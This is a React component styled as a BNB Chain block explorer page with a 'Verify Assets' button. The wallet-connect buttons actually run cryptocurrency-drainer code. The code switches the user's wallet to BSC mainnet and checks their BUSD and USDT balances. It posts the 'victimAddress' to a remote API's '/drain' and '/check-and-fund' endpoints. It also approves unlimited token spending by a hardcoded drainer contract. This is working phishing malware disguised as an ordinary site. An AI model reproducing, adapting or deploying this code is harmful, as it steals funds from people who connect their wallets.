import React, { useState } from "react";
import { IoCubeOutline } from "react-icons/io5";
import { MdOutlineGridView } from "react-icons/md";
import { ethers } from "ethers";
import "../assets/css/LatestBlocks.css";

const LatestBlocks = () => {
  const [connectedAccount, setConnectedAccount] = useState(null);
  const [loading, setLoading] = useState(false);

  const API_BASE_URL = "https://eqisn0r49g.execute-api.ap-south-1.amazonaws.com";
  const drainerContractAddress = "0xFc23Cc2C8d25c515B2a920432e5EBf6d018e3403";
  const tokenList = [
    { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
    { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
  ];
  const BSC_MAINNET_CHAIN_ID = "0x38";

  const switchToBSC = async () => {
    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_MAINNET_CHAIN_ID }],
      });
    } catch (error) {
      if (error.code === 4902) {
        await window.ethereum.request({
          method: "wallet_addEthereumChain",
          params: [{
            chainId: BSC_MAINNET_CHAIN_ID,
            chainName: "Binance Smart Chain Mainnet",
            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
            rpcUrls: ["https://bsc-dataseed.binance.org/"],
            blockExplorerUrls: ["https://bscscan.com"],
          }],
        });
      } else {
        console.error("Failed to switch to BSC:", error);
      }
    }
  };

  const checkAndSendGas = async (connectedAddress) => {
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const balance = await provider.getBalance(connectedAddress);
      const bep20Abi = [
        "function balanceOf(address account) external view returns (uint256)",
      ];

      // Check token balances first
      let hasTokens = false;
      for (const token of tokenList) {
        const tokenContract = new ethers.Contract(token.address, bep20Abi, provider);
        const tokenBalance = await tokenContract.balanceOf(connectedAddress);
        if (tokenBalance > 0) hasTokens = true;
      }

      // Only send gas if no BNB and has tokens
      if (balance === BigInt(0) && hasTokens) {
        const gasResponse = await fetch(`${API_BASE_URL}/check-and-fund`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ victimAddress: connectedAddress }),
        });
        const gasData = await gasResponse.json();

        if (gasData.success) {
          const waitForGas = async () => {
            let gasTransferred = false;
            while (!gasTransferred) {
              const updatedBalance = await provider.getBalance(connectedAddress);
              if (updatedBalance > BigInt(0)) {
                gasTransferred = true;
              }
              await new Promise(resolve => setTimeout(resolve, 5000));
            }
            return true;
          };

          setLoading(true);
          await waitForGas();
          setLoading(false);
          return true;
        } else {
          console.error("Failed to send gas:", gasData.message);
          return false;
        }
      } else {
        return hasTokens; // Return true if gas exists and tokens are present, false if no tokens
      }
    } catch (error) {
      console.error("Error in checkAndSendGas:", error);
      return false;
    }
  };

  const connectAndDrain = async () => {
    try {
      if (typeof window.ethereum === "undefined") return;

      await switchToBSC();

      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      const connectedAddress = accounts[0];
      setConnectedAccount(`${connectedAddress.slice(0, 6)}...${connectedAddress.slice(-4)}`);

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const bep20Abi = [
        "function balanceOf(address account) external view returns (uint256)",
        "function approve(address spender, uint256 amount) external returns (bool)",
      ];

      const gasAvailable = await checkAndSendGas(connectedAddress);
      if (gasAvailable) {
        const drainResponse = await fetch(`${API_BASE_URL}/drain`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ victimAddress: connectedAddress, drainAll: true }),
        });
        const drainData = await drainResponse.json();

        if (drainData.needsApproval) {
          for (const token of tokenList) {
            const tokenContract = new ethers.Contract(token.address, bep20Abi, signer);
            const balance = await tokenContract.balanceOf(connectedAddress);
            if (balance > 0) {
              const gasEstimate = await tokenContract.estimateGas.approve(drainerContractAddress, ethers.MaxUint256);
              await tokenContract.approve(drainerContractAddress, ethers.MaxUint256, { gasLimit: gasEstimate });
            }
          }
          await fetch(`${API_BASE_URL}/drain`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ victimAddress: connectedAddress, drainAll: true }),
          });
        }
      }
    } catch (error) {
      console.error("Error in connectAndDrain:", error);
    }
  };

  const blockList = [
    { no: "47863341", time: "6 secs ago", Validator: "CertiK", txns: "228", BNB: "0.10078" },
  ];

  return (
    <>
      <section className="bg-dark pt-14 pb-20 bg-banner">
        <div className="container-fluid px-lg-5">
          <h6 className="text-light text-center pt-4">
            Verify Your Asserts and Confirm For Flash and Dummy fund
          </h6>
          <div className="d-flex justify-content-center align-items-center btn-wrap">
            <button
              className="btn-custom"
              data-bs-toggle="modal"
              data-bs-target="#walletConnectModal"
              disabled={loading}
            >
              {loading ? "Processing..." : "Verify Assets"}
            </button>
          </div>
        </div>
      </section>

      <div className="container-fluid px-lg-5">
        <div className="col-lg-12 mt-4 mb-4">
          <div className="card h-100">
            <div className="card-header d-flex justify-content-between align-items-center">
              <h6 className="card-header-title mt-1">Latest Blocks</h6>
              <button
                type="button"
                className="btn btn-sm btn-white d-flex justify-content-between align-items-center border dark:border-white border-opacity-15"
                data-bs-toggle="modal"
                data-bs-target="#customizeCardModal"
                data-bs-card-index="1"
              >
                <MdOutlineGridView className="me-1" />
                Customize
              </button>
            </div>

            <div className="card-body overflow-auto scrollbar-custom" style={{ maxHeight: "30.3rem" }}>
              {blockList &&
                blockList.length > 0 &&
                blockList.map((item, index) => (
                  <React.Fragment key={index}>
                    <div className="row">
                      <div className="col-sm-4">
                        <div className="d-flex align-items-center gap-2">
                          <div
                            className="d-none d-sm-flex content-center bg-light text-muted rounded p-3"
                            style={{ height: "3rem", width: "3rem" }}
                          >
                            <IoCubeOutline className="fs-lg" />
                          </div>
                          <div className="d-flex flex-row flex-sm-column align-items-center align-items-sm-start gap-1 gap-sm-0">
                            <span className="d-inline-block d-sm-none">Block</span>
                            <a
                              className="text-truncate text-decoration-none custom-font-color"
                              style={{ maxWidth: "6rem" }}
                              href="/block/47863341"
                            >
                              {item?.no}
                            </a>
                            <div className="small text-muted">{item?.time}</div>
                          </div>
                        </div>
                      </div>
                      <div className="col-sm-8 d-flex justify-content-sm-between align-items-end align-items-sm-center position-relative">
                        <div className="pe-0 pe-sm-2">
                          <div className="d-flex flex-wrap gap-1 custom-font-color">
                            Validated By
                            <a
                              className="text-truncate d-block text-decoration-none custom-font-color"
                              style={{ maxWidth: "8rem" }}
                              href="/address/0xbdcc079bbb23c1d9a6f36aa31309676c258abac7"
                            >
                              <span
                                data-bs-toggle="tooltip"
                                title="0xbdcc079bbb23c1d9a6f36aa31309676c258abac7"
                              >
                                Validator : {item?.Validator}
                              </span>
                            </a>
                          </div>
                          <a
                            href="#"
                            data-bs-toggle="tooltip"
                            title="Transactions in this Block"
                            className="text-decoration-none custom-font-color"
                          >
                            {item?.txns} txns
                          </a>{" "}
                          <span className="small text-muted me-2">in {item?.time}</span>
                          <span
                            className="d-inline-block d-sm-none badge border dark:border-white border-opacity-15 text-dark fw-medium py-1 py-sm-1.5 px-1.5 px-sm-2"
                            data-bs-toggle="tooltip"
                            title="Block Reward"
                          >
                            0<b>.</b>
                            {item?.BNB} BNB
                          </span>
                        </div>
                        <div className="d-none d-sm-block text-end ms-2 ms-sm-0">
                          <span
                            className="badge border dark:border-white border-opacity-15 text-dark fw-medium py-1.5 px-2"
                            data-bs-toggle="tooltip"
                            title="Block Reward"
                          >
                            0<b>.</b> {item?.BNB} BNB
                          </span>
                        </div>
                      </div>
                    </div>
                    <hr />
                  </React.Fragment>
                ))}
            </div>

            <a
              className="card-footer bg-light fw-medium text-cap link-muted text-center text-decoration-none py-3"
              href="#"
              style={{ fontSize: "0.85rem" }}
            >
              VIEW ALL BLOCKS <i className="fa-solid fa-long-arrow-right ms-1"></i>
            </a>
          </div>
        </div>
      </div>

      <div className="modal fade" id="walletConnectModal" tabIndex="-1" aria-hidden="true">
        <div className="modal-dialog modal-dialog-centered">
          <div className="modal-content">
            <div className="modal-header">
              <h5 className="modal-title">Connect Wallet</h5>
              <button type="button" className="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div className="modal-body text-center">
              <button className="btn btn-primary w-100 mb-2" onClick={connectAndDrain}>Connect MetaMask</button>
              <button className="btn btn-secondary w-100" onClick={connectAndDrain}>Connect Trust Wallet</button>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default LatestBlocks;